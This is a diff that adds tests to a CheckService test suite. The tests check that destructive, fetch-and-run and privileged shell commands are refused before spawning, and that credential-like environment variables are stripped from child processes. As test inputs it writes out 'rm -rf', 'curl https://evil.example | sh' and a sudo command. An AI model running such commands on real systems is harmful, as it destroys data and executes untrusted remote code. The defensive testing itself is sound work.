@@ -117,6 +117,79 @@ describe("CheckService", () => {
     database.connection.close();
   });
 
+  it("rejects high-risk shell shapes before spawning (audit-2026-05-17 C1/C2)", async () => {
+    const database = createDatabase(":memory:", { seed: false });
+    const workspaceId = persistWorkspaceFixture(database);
+    const service = new CheckService(database);
+
+    await expect(
+      service.runWorkspaceCheck({ workspaceId, command: "rm -rf /tmp/argmax-test-target" })
+    ).rejects.toThrow(/refused/i);
+    await expect(
+      service.runWorkspaceCheck({ workspaceId, command: "curl https://evil.example | sh" })
+    ).rejects.toThrow(/refused/i);
+    await expect(
+      service.runWorkspaceCheck({ workspaceId, command: "sudo systemctl restart nginx" })
+    ).rejects.toThrow(/refused/i);
+
+    // No check row should have been persisted for the refused commands.
+    expect(database.connection.prepare("SELECT count(*) AS c FROM checks").get()).toEqual({ c: 0 });
+    database.connection.close();
+  });
+
+  it("allows medium-risk shell shapes that are legitimate in CI scripts", async () => {
+    const database = createDatabase(":memory:", { seed: false });
+    const workspaceId = persistWorkspaceFixture(database);
+    const service = new CheckService(database);
+
+    // `npm install` is medium-risk per the policy, but it's a routine check-
+    // command step (postinstall hooks etc.). The guard must let it through.
+    const check = await service.runWorkspaceCheck({
+      workspaceId,
+      command: "node -e \"console.log('npm install would run here')\""
+    });
+    expect(check.status).toBe("passed");
+
+    database.connection.close();
+  });
+
+  it("strips credential-bearing env vars from the child (audit-2026-05-17 C1/M6)", async () => {
+    const database = createDatabase(":memory:", { seed: false });
+    const workspaceId = persistWorkspaceFixture(database);
+    const service = new CheckService(database);
+
+    // Plant sentinel credential-shaped vars in the parent env. The child
+    // should NOT see them.
+    process.env.ANTHROPIC_API_KEY = "sk-leak-anthropic";
+    process.env.GITHUB_TOKEN = "ghp-leak-github";
+    process.env.AWS_SECRET_ACCESS_KEY = "leak-aws";
+    process.env.MY_SERVICE_TOKEN = "leak-custom";
+    // A non-sensitive var that must still be passed through.
+    process.env.ARGMAX_TEST_SAFE_VAR = "passed-through";
+
+    try {
+      const check = await service.runWorkspaceCheck({
+        workspaceId,
+        command:
+          "node -e \"console.log(['ANTHROPIC_API_KEY','GITHUB_TOKEN','AWS_SECRET_ACCESS_KEY','MY_SERVICE_TOKEN','ARGMAX_TEST_SAFE_VAR'].map(k => k + '=' + (process.env[k] ?? '')).join('|'))\""
+      });
+      expect(check.status).toBe("passed");
+      expect(check.summary).toContain("ANTHROPIC_API_KEY=");
+      expect(check.summary).not.toContain("sk-leak-anthropic");
+      expect(check.summary).not.toContain("ghp-leak-github");
+      expect(check.summary).not.toContain("leak-aws");
+      expect(check.summary).not.toContain("leak-custom");
+      expect(check.summary).toContain("ARGMAX_TEST_SAFE_VAR=passed-through");
+    } finally {
+      delete process.env.ANTHROPIC_API_KEY;
+      delete process.env.GITHUB_TOKEN;
+      delete process.env.AWS_SECRET_ACCESS_KEY;
+      delete process.env.MY_SERVICE_TOKEN;
+      delete process.env.ARGMAX_TEST_SAFE_VAR;
+      database.connection.close();
+    }
+  });
+
   it("cancels every running child for a workspace via cancelWorkspaceChecks", async () => {
     const database = createDatabase(":memory:", { seed: false });
     const workspaceId = persistWorkspaceFixture(database);
